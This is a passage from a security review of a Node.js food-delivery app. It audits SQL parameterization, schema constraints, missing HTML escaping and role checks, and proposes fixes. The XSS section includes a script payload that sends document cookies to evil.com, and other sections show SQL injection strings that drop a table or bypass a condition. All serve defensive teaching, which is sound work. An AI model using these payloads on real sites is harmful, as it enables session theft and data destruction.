+  updateStatus     --> UPDATE ... SET status = ? WHERE assignmentId = ? SAFE
+
+RESULT: All 27 queries are parameterized. SQL injection protection is solid.
+
+------------------------------------------------------------------------
+WARNING: multipleStatements: true in Database.mjs
+------------------------------------------------------------------------
+The database pool is configured with:
+  multipleStatements: true,
+
+This allows multiple SQL statements to be executed in one pool.query() call.
+It is needed for the schema creation at startup (many CREATE TABLE statements).
+
+However, if multipleStatements is true AND you ever used string concatenation
+instead of ? placeholders, an attacker could inject a second statement:
+
+  // hypothetical danger (NOT your current code — just an example):
+  const id = "1; DROP TABLE Customer; --";
+  pool.query("SELECT * FROM Customer WHERE userId = '" + id + "'");
+  // Executes: SELECT ...  AND THEN  DROP TABLE Customer
+
+Since ALL your repository methods use pool.execute() with ? placeholders,
+the multipleStatements flag does NOT affect their safety. But it is still
+best practice to disable it for normal queries and only enable it in the
+one-time schema initialization function.
+
+------------------------------------------------------------------------
+BONUS: WHAT HAPPENS TO passwordHash IN YOUR API RESPONSES
+------------------------------------------------------------------------
+Your repositories do SELECT * FROM Customer, which returns ALL columns
+including passwordHash. This row object is eventually stored in the
+Session table and returned by verifyToken().
+
+In Controllers, you destructure { userId } or { userEmail } from it.
+This is fine. But if you ever serialized the full session row to JSON
+and sent it to the client, the passwordHash would leak.
+
+Best practice: always SELECT only the columns you need:
+  SELECT userId, email FROM Customer WHERE email = ?
+
+
+================================================================================
+9. LAYER 7 — DATABASE SCHEMA (DB-LEVEL CONSTRAINTS)
+================================================================================
+
+FILE: Database/Database.mjs  (the schema string at the top of the file)
+
+The database is your ABSOLUTE LAST line of defense. Constraints defined in
+the schema protect data integrity even if all higher layers fail.
+
+------------------------------------------------------------------------
+WHAT YOUR SCHEMA DOES CORRECTLY
+------------------------------------------------------------------------
+
+Customer table:
+  userId       VARCHAR(36) PRIMARY KEY         -- UUID, never user-supplied
+  email        VARCHAR(100) UNIQUE NOT NULL    -- enforces uniqueness at DB level
+  passwordHash VARCHAR(255) NOT NULL           -- only the hash is ever stored
+
+  CHECK  UNIQUE on email: prevents two accounts with the same email
+  CHECK  VARCHAR(100): caps email at 100 characters
+  CHECK  NOT NULL: email and hash can never be empty rows
+
+Courrier table:
+  phoneNumber  VARCHAR(20) UNIQUE NOT NULL
+  CHECK  UNIQUE: prevents two couriers registering with the same number
+
+MenuItem table:
+  price DECIMAL(10, 2) NOT NULL
+  CHECK  DECIMAL(10,2): the correct type for money.
+         Using FLOAT for currency causes rounding errors.
+         Example: in FLOAT, 0.1 + 0.2 = 0.30000000000000004, not 0.30.
+         DECIMAL is exact.
+
+Order table:
+  FOREIGN KEY (customerId)    REFERENCES Customer(userId)
+  FOREIGN KEY (restaurantId)  REFERENCES Restaurant(restaurantId)
+  CHECK  referential integrity: you cannot create an Order for a non-existent customer
+
+OrderItem table:
+  UNIQUE KEY uq_order_item (orderId, itemName)
+  ON DUPLICATE KEY UPDATE quantity = quantity + 1
+  CHECK  prevents two rows for the same item in the same order
+
+------------------------------------------------------------------------
+WHAT COULD BE IMPROVED IN THE SCHEMA
+------------------------------------------------------------------------
+
+1. No CHECK constraint on price
+   -----------------------------------------------------------------------
+   DECIMAL(10,2) prevents wrong types but does NOT prevent negative prices.
+   If the controller sends price = -99.00, the DB accepts it.
+
+   [SHOULD ADD]:
+     price DECIMAL(10, 2) NOT NULL CHECK (price >= 0)
+
+   MySQL 8.0+ fully supports CHECK constraints.
+   This is the deepest possible safety net for price values.
+
+2. Status column uses VARCHAR(50) instead of ENUM
+   -----------------------------------------------------------------------
+   [CURRENT CODE]:
+     status VARCHAR(50) NOT NULL
+
+   Any string up to 50 characters is accepted.
+
+   [COULD BE]:
+     status ENUM('Incomplete Cart', 'Submitted', 'Preparing', 'On the way', 'Delivered') NOT NULL
+
+   An ENUM column rejects any value not in its list at the database level.
+   This enforces your OrderStatus constants at the storage layer.
+
+   Trade-off: ENUM columns make schema migrations harder.
+   If you rename a status value, you must ALTER TABLE instead of just updating
+   a constant. VARCHAR with app-level validation (DTO + Model) is also acceptable
+   and more flexible.
+
+3. Session table has no expiry enforcement
+   -----------------------------------------------------------------------
+   [CURRENT CODE]:
+     createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+
+   The session never expires in the database. The Max-Age=3600 on the cookie
+   tells the browser to stop sending the cookie after 1 hour. But if someone
+   copies the cookie value before it expires, the session row in the DB is
+   valid forever.
+
+   [SHOULD ADD — an application-level cleanup or MySQL event]:
+     DELETE FROM Session WHERE createdAt < NOW() - INTERVAL 1 HOUR;
+
+   This query should run periodically (e.g. on each login, or via a cron job).
+
+4. No CHECK constraint on email format
+   -----------------------------------------------------------------------
+   MySQL 8.0+ can enforce email format with a CHECK constraint:
+
+   [COULD ADD]:
+     email VARCHAR(100) UNIQUE NOT NULL CHECK (email LIKE '%@%.%')
+
+   This is a simple check, not a full RFC 5321 validation, but it catches
+   obvious errors like empty strings or values without @ that might slip through.
+
+
+================================================================================
+10. LAYER 8 — HTML OUTPUT (XSS PREVENTION)
+================================================================================
+
+FILE: Utils/renderHTML.mjs
+
+THIS IS THE MOST CRITICAL SECURITY ISSUE IN YOUR APP.
+The entire dynamic output layer is missing HTML escaping.
+
+------------------------------------------------------------------------
+WHAT IS XSS?
+------------------------------------------------------------------------
+XSS stands for Cross-Site Scripting.
+It is one of the most dangerous and common web vulnerabilities (OWASP Top 10).
+
+It happens when user-supplied data is embedded into HTML output WITHOUT
+being escaped first. This lets an attacker inject JavaScript that runs in
+the browser of every user who views that page.
+
+A successful XSS attack can:
+  - Steal session cookies from all users who view the page
+  - Submit forms on behalf of logged-in users (CSRF-like)
+  - Redirect users to phishing pages
+  - Deface the entire page
+
+------------------------------------------------------------------------
+HOW YOUR renderHTML WORKS
+------------------------------------------------------------------------
+Utils/renderHTML.mjs:
+
+  for (const [key, value] of Object.entries(data)) {
+    html = html.replaceAll(`{{${key}}}`, value);  // raw replacement, no escaping
+  }
+
+This replaces {{key}} directly with value, whatever it contains.
+If value has HTML tags, script tags, or event handlers, they go straight into
+the page as executable code.
+
+------------------------------------------------------------------------
+THE ATTACK: STORED XSS VIA RESTAURANT NAME
+------------------------------------------------------------------------
+A restaurant manager registers with the restaurant name:
+
+  <script>fetch("https://evil.com/?c="+document.cookie)</script>
+
+Your RestaurantController.mjs does:
+  await restaurantRepo.createRestaurant(v4(), restaurantName, manager.userId);
+
+The string is stored as-is in the database.
+
+Then PageController.mjs renders the home page for every customer:
+  restaurantList = restaurants.map(r =>
+    `<li><a href="/restaurant/menu?id=${r.restaurantId}">${r.restaurantName}</a></li>`
+  ).join("");
+  await renderHTML(res, "User-HomeView.html", { restaurantList });
+
+The HTML sent to every customer's browser is:
+  <li><a href="..."><script>fetch("https://evil.com/?c="+document.cookie)</script></a></li>
+
+The browser executes that script. The attacker now has the session cookie
+of every customer who visits the home page.
+
+------------------------------------------------------------------------
+EVERY PLACE IN YOUR APP WHERE XSS CAN OCCUR
+------------------------------------------------------------------------
+
+PageController.mjs — home():
+  r.restaurantName   injected into the anchor text of each restaurant link
+
+PageController.mjs — restaurantMenu():
+  i.name             injected into hidden input value AND displayed text
+  i.description      injected into <small> tag content
+  restaurantId       injected into a hidden form input value
+
+RestaurantController.mjs — dashboard():
+  restaurantName     injected into <title> and <nav> span
+  o.orderId          injected into a hidden form input value
+  o.status           injected into <strong> tag
+  i.name             injected into <li> content
+  c.phoneNumber      injected into <option> text
+
+CourrierController.mjs — dashboard():
+  a.orderId          injected into <li> text content
+  a.status           injected into <strong> tag content
+
+OrderController.mjs — view():
+  i.itemName         injected into <li> content
+  order.status       injected into the page via {{orderStatus}}
+  orderId            injected into a hidden form input AND page title
+
+------------------------------------------------------------------------
+THE FIX: HTML ESCAPING
+------------------------------------------------------------------------
+Before inserting ANY data into an HTML string, escape the 5 special characters:
+
+  &  -->  &amp;    (must be first — otherwise you'd double-escape the & in other codes)
+  <  -->  &lt;
+  >  -->  &gt;
+  "  -->  &quot;   (important inside attribute values)
+  '  -->  &#x27;   (important inside attribute values)
+
+[CREATE a new file]: Utils/escapeHTML.mjs
+
+  export const escapeHTML = (val) => {
+    if (val === null || val === undefined) return "";
+    return String(val)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#x27;");
+  };
+
+Then USE it everywhere data is inserted into HTML strings.
+
+[CURRENT CODE] PageController.mjs — home():
+  restaurants.map(r =>
+    `<li><a href="/restaurant/menu?id=${r.restaurantId}">${r.restaurantName}</a></li>`
+  )
+
+[SHOULD BE]:
+  import { escapeHTML } from "../Utils/escapeHTML.mjs";
+
+  restaurants.map(r =>
+    `<li><a href="/restaurant/menu?id=${escapeHTML(r.restaurantId)}">${escapeHTML(r.restaurantName)}</a></li>`
+  )
+
+[CURRENT CODE] OrderController.mjs — view():
+  items.map(i => `<li>${i.itemName} — $${i.price}</li>`)
+
+[SHOULD BE]:
+  items.map(i => `<li>${escapeHTML(i.itemName)} — $${escapeHTML(String(i.price))}</li>`)
+
+[CURRENT CODE] Utils/renderHTML.mjs — the {{key}} replacement:
+  html = html.replaceAll(`{{${key}}}`, value);
+
+[SHOULD BE — if the value being injected is NOT pre-built HTML]:
+  html = html.replaceAll(`{{${key}}}`, escapeHTML(value));
+
+IMPORTANT NOTE ON PRE-BUILT HTML STRINGS:
+Some values you inject are themselves HTML strings you built, like:
+  restaurantList = restaurants.map(r => `<li>...</li>`).join("")
+  await renderHTML(res, "...", { restaurantList });
+
+You do NOT escape restaurantList in renderHTML because it is intentional HTML.
+You DO escape each individual field (r.restaurantName, r.restaurantId) when you
+BUILD that HTML string, as shown above.
+
+RULE OF THUMB: Escape every variable at the point where it enters an HTML string.
+No exceptions. Not even numeric IDs — because their original source was user input
+that was stored in the database at some point.
+
+------------------------------------------------------------------------
+CONTENT SECURITY POLICY (SECOND LINE OF DEFENSE AGAINST XSS)
+------------------------------------------------------------------------
+Even after adding escapeHTML everywhere, add a Content-Security-Policy header
+as a second safety net. It tells the browser to refuse to execute any inline
+or external scripts.
+
+[SHOULD ADD to Utils/renderHTML.mjs and Utils/sendHTML.mjs]:
+
+  res.writeHead(200, {
+    "Content-Type":              "text/html; charset=utf-8",
+    "Content-Security-Policy":   "default-src 'self'; script-src 'none'",
+    "X-Content-Type-Options":    "nosniff",
+    "X-Frame-Options":           "DENY",
+  });
+
+Explanation of each header:
+  Content-Security-Policy: default-src 'self'; script-src 'none'
+    -- Only allow loading resources (images, CSS, fonts) from your own origin.
+    -- Block ALL JavaScript, both inline <script> tags and external <script src="">.
+    -- Even if an XSS payload somehow gets through, the browser will not execute it.
+
+  X-Content-Type-Options: nosniff
+    -- Prevents the browser from guessing the content type of a response.
+    -- Without this, a browser might decide to execute a text/plain response as JavaScript.
+
+  X-Frame-Options: DENY
+    -- Prevents your pages from being embedded in <iframe> on another site.
+    -- Protects against clickjacking attacks.
+
+
+================================================================================
+11. THE GUARD (AUTHENTICATION & AUTHORIZATION)
+================================================================================
+
+FILE: Guard/Guard.mjs
+
+------------------------------------------------------------------------
+WHAT IT DOES
+------------------------------------------------------------------------
+Guard is a chainable authentication and authorization helper.
+It sits between the Router and any protected operation.
+
+The intended usage pattern (documented in the file itself):
+
+  const { userId } = await new Guard()
+    .authenticate(req)      // Step 1: Is anyone logged in?
+    .authorize("Manager")   // Step 2: Is it the right role?
+    .payload;               // Step 3: Give me the identity
+
+------------------------------------------------------------------------
+WHAT IT DOES CORRECTLY
+------------------------------------------------------------------------
+authenticate():
+  Reads the session token from the request cookie.
+  Looks it up in the Session table.
+  Throws if the cookie is missing, the token is not in the DB, or the session
+  has been revoked. This is authentication: proving who the user is.
+
+authorize():
+  Checks that the session's role matches one of the allowed roles.
+  Throws if the role is wrong. This is role-based authorization.
+
+requireOwnership():
+  Checks that session.userId matches the ownerId of the resource.
+  Throws if the user does not own the resource.
+  Example: a customer can only cancel THEIR OWN order.
+
+------------------------------------------------------------------------
+THE PROBLEM: GUARD EXISTS BUT IS NOT USED
+------------------------------------------------------------------------
+All controllers call verifyToken() directly instead of using the Guard.
+More importantly: NO controller currently checks the user's ROLE.
+
+Current vulnerabilities:
+
+  RestaurantController.mjs — dashboard():
+    [CURRENT CODE]:
+      const { userId, restaurantName } = await verifyToken(req);
+    PROBLEM: A Customer or Courrier can access /restaurant/dashboard
+             if they know the URL. No role check.
+
+  CourrierController.mjs — dashboard():
+    [CURRENT CODE]:
+      const { userId } = await verifyToken(req);
+    PROBLEM: A Customer or Manager can access /courrier/dashboard.
+
+  PageController.mjs — home():
+    [CURRENT CODE]:
+      const { userEmail } = await verifyToken(req);
+    PROBLEM: A Manager or Courrier can access /home.
+             They have no orders and no reason to be on the customer home page.
+
+  RestaurantController.mjs — assignCourier():
+    [CURRENT CODE]:
+      const { userId } = await verifyToken(req);
+    PROBLEM: Any authenticated user (Customer, Courrier) can submit a POST
+             to /order/assign. The code checks restaurant ownership further
+             down, but role is never verified.
+
+[SHOULD BE]:
+
+  RestaurantController.mjs — dashboard():
+    const { userId, restaurantName } = await new Guard()
+      .authenticate(req)
+      .authorize(UserRoles.MANAGER)    // only Managers allowed here
+      .payload;
+
+  CourrierController.mjs — dashboard():
+    const { userId } = await new Guard()
+      .authenticate(req)
+      .authorize(UserRoles.COURRIER)   // only Couriers allowed here
+      .payload;
+
+  PageController.mjs — home():
+    const { userEmail } = await new Guard()
+      .authenticate(req)
+      .authorize(UserRoles.CUSTOMER)   // only Customers allowed here
+      .payload;
+
+  OrderController.mjs — cancel():
+    const guard = await new Guard().authenticate(req);
+    const order = await repository.findById(orderId);
+    if (!order) return errorController(HTTP_STATUS.NOT_FOUND, req, res);
+    guard.requireOwnership(order.customerId);   // only the order owner can cancel
+    const { userId } = guard.payload;
+
+------------------------------------------------------------------------
+WHY AUTHORIZATION IS A FORM OF INPUT VALIDATION
+------------------------------------------------------------------------
+Authorization validates WHO is making the request.
+A request from the wrong role is invalid input — the same way
+a negative price or a malformed email is invalid input.
+Both should be rejected before any business logic runs.
+
+
+================================================================================
+12. SUMMARY TABLE: WHAT WE HAVE vs. WHAT WE NEED
+================================================================================
+
+LAYER               FILE(S)                            STATUS    WHAT IS MISSING
+------              ------                             ------    ---------------
+1. HTML Views        Views/*.html                      PARTIAL   minlength, maxlength, pattern on some inputs
+2. Body Parser       Utils/bodyParser.mjs              PARTIAL   Body size limit; error event; content-type check
+3. DTOs              (none exist)                      MISSING   Entire DTO layer must be created
+4. Controllers       Controllers/*.mjs                 PARTIAL   No DTO usage; no query param validation; no role enforcement
+5. Models            Models/*.mjs                      PARTIAL   No input validation before DB calls; no bcrypt DoS guard
+6. Repositories      Database/*Repository.mjs          GOOD      All 27 queries parameterized; SQL injection protected
+7. DB Schema         Database/Database.mjs             PARTIAL   No CHECK on price; VARCHAR instead of ENUM for status; sessions never expire
+8. HTML Output       Utils/renderHTML.mjs              MISSING   No HTML escaping — XSS on every dynamic page
+9. Guard             Guard/Guard.mjs                   PARTIAL   Guard exists but is not wired into controllers; role checks missing everywhere
+
+------------------------------------------------------------------------
+SEVERITY RANKING (most critical first)
+------------------------------------------------------------------------
+
+  CRITICAL  Layer 8 — XSS on every dynamic page (no escapeHTML anywhere)
+  HIGH      Layer 4 — any string can be written as delivery status (no whitelist)
+  HIGH      Layer 9 — no role authorization; cross-role access to all dashboards
+  MEDIUM    Layer 3 — missing DTO layer (no centralized validation)
+  MEDIUM    Layer 2 — no body size limit (DoS attack possible)
+  MEDIUM    Layer 5 — no model-level validation (models not self-protecting)
+  LOW       Layer 1 — missing HTML attributes (UX only, bypassed by curl)
+  LOW       Layer 7 — schema improvements (defense-in-depth, good to have)
+
+
+================================================================================
+13. QUICK REFERENCE: VALIDATION HELPERS IN PLAIN NODE.JS
+================================================================================
+
+No frameworks, no external libraries — just vanilla JavaScript.
+
+------------------------------------------------------------------------
+EMAIL VALIDATION
+------------------------------------------------------------------------
+  const isValidEmail = (email) =>
+    typeof email === "string" && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+  // Usage:
+  if (!isValidEmail(dto.email)) throw new Error("Invalid email format");
+
+  What the regex means:
+    [^\s@]+   -- one or more characters that are not whitespace or @
+    @         -- the literal @ symbol
+    [^\s@]+   -- domain name (no spaces, no @)
+    \.        -- the dot before the TLD
+    [^\s@]+   -- the top-level domain (e.g. com, org)
+
+------------------------------------------------------------------------
+PHONE NUMBER VALIDATION
+------------------------------------------------------------------------
+  const isValidPhone = (phone) =>
+    typeof phone === "string" && /^\+?[0-9\s\-]{7,20}$/.test(phone.trim());
+
+  // Accepts: "+1 555 000 0000", "0501234567", "+961-70-123456"
+  // Rejects: "abc", "", "12"
+
+------------------------------------------------------------------------
+STRING LENGTH VALIDATION
+------------------------------------------------------------------------
+  const isInRange = (str, min, max) =>
+    typeof str === "string" && str.length >= min && str.length <= max;
+
+  // Usage:
+  if (!isInRange(dto.name, 2, 100)) throw new Error("Name must be 2–100 characters");
+
+------------------------------------------------------------------------
+PRICE VALIDATION
+------------------------------------------------------------------------
+  const isValidPrice = (val) => {
+    const n = parseFloat(val);
+    return !isNaN(n) && isFinite(n) && n >= 0 && n <= 9999.99;
+  };
+
+  // Usage:
+  if (!isValidPrice(rawData.price)) throw new Error("Invalid price");
+
+  // Sanitize after validating:
+  const price = Math.round(parseFloat(rawData.price) * 100) / 100;
+
+  Why Math.round? Floating-point arithmetic can produce:
+    parseFloat("9.999") * 100 = 999.9000000000001  (not exactly 1000)
+    Math.round(999.9000000000001) / 100 = 10.00    (correct)
+
+------------------------------------------------------------------------
+UUID VALIDATION (for query string ?id= params)
+------------------------------------------------------------------------
+  const isValidUUID = (id) =>
+    /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(id);
+
+  // Usage in a controller reading ?id= from the URL:
+  const restaurantId = url.searchParams.get("id");
+  if (!restaurantId || !isValidUUID(restaurantId)) {
+    return errorController(HTTP_STATUS.BAD_REQUEST, req, res);
+  }
+
+  Why validate UUIDs? Your IDs are generated with v4() (UUID version 4).
+  If someone sends "' OR '1'='1" as the ID, the parameterized query protects you,
+  but validating UUID format first means you reject invalid IDs before touching
+  the database at all — faster and cleaner.
+
+------------------------------------------------------------------------
+ENUM / WHITELIST VALIDATION
+------------------------------------------------------------------------
+  const isAllowedStatus = (status) =>
+    Object.values(OrderStatus).includes(status);
+
+  // Usage:
+  if (!isAllowedStatus(dto.status)) throw new Error("Invalid order status");
+
+  Why Object.values()? Because your OrderStatus constants use keys like
+  DELIVERED, ONTHEWAY, etc., but the actual string values are "Delivered",
+  "On the way", etc. Object.values() gives you the actual stored strings.
+
+------------------------------------------------------------------------
+HTML ESCAPING
+------------------------------------------------------------------------
+  export const escapeHTML = (val) => {
+    if (val === null || val === undefined) return "";
+    return String(val)
+      .replace(/&/g, "&amp;")   // MUST be first
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#x27;");
+  };
+
+  Why & must be replaced first:
+    If you replace < first, you get &lt;
+    If you then replace & in &lt;, you get &amp;lt; (double-escaped)
+    Always escape & first to avoid corrupting the other escape sequences.
+
+------------------------------------------------------------------------
+SANITIZE A STRING (trim + collapse internal whitespace)
+------------------------------------------------------------------------
+  const sanitizeString = (val) =>
+    String(val ?? "").trim().replace(/\s+/g, " ");
+
+  // "  Pizza   Palace  "  -->  "Pizza Palace"
+
+------------------------------------------------------------------------
+SANITIZE A PRICE
+------------------------------------------------------------------------
+  const sanitizePrice = (val) => Math.round(parseFloat(val ?? 0) * 100) / 100;
+
+  // "9.999"  -->  10.00
+  // "9.994"  -->  9.99
+  // "abc"    -->  NaN  (then validate: isValidPrice will reject it)
+
+------------------------------------------------------------------------
+COMPLETE EXAMPLE: ALL LAYERS WORKING TOGETHER
+------------------------------------------------------------------------
+This shows the full validated flow for one operation — adding a menu item:
+
+  // 1. HTML View (Views/Dash-ManagerView.html):
+  <input type="text"   name="name"  required minlength="2" maxlength="100" />
+  <input type="number" name="price" required step="0.01"   min="0" max="9999.99" />
+  <input type="text"   name="description"                  maxlength="500" />
+
+  // 2. Body Parser (Utils/bodyParser.mjs):
+  const raw = await parseBody(req);   // size-limited, content-type checked
+
+  // 3. DTO (DTOs/AddMenuItemDTO.mjs):
+  const dto = new AddMenuItemDTO(raw);
+  // - sanitizes: trim name, parseFloat price, trim description
+  // - validates: name 2-100 chars, price 0-9999.99, description <= 500 chars
+  // - throws Error if anything is invalid
+
+  // 4. Controller (Controllers/RestaurantController.mjs):
+  const { userId } = await new Guard()
+    .authenticate(req)
+    .authorize(UserRoles.MANAGER)   // role check
+    .payload;
+  // passes dto fields to the model
+
+  // 5. Repository (Database/RestaurantRepository.mjs):
+  async addMenuItem(itemId, restaurantId, name, price, description) {
+    await this.#database.query(
+      `INSERT INTO MenuItem(itemId, restaurantId, name, price, description)
+       VALUES (?, ?, ?, ?, ?)`,
+      [itemId, restaurantId, name, price, description ?? null]
+    );
+  }
+  // parameterized query — SQL injection impossible
+
+  // 6. Database Schema (Database/Database.mjs):
+  price DECIMAL(10, 2) NOT NULL CHECK (price >= 0)
+  -- DB-level type enforcement and negative price guard
+
+  // 7. When displaying menu items back in HTML:
+  import { escapeHTML } from "../Utils/escapeHTML.mjs";
+  items.map(i => `
+    <li>
+      ${escapeHTML(i.name)} — $${escapeHTML(String(Number(i.price).toFixed(2)))}
+      <br><small>${escapeHTML(i.description ?? "")}</small>
+    </li>
+  `)
+  // XSS impossible — all user-originated values are escaped
+
+
+================================================================================
+END OF DOCUMENT
+================================================================================
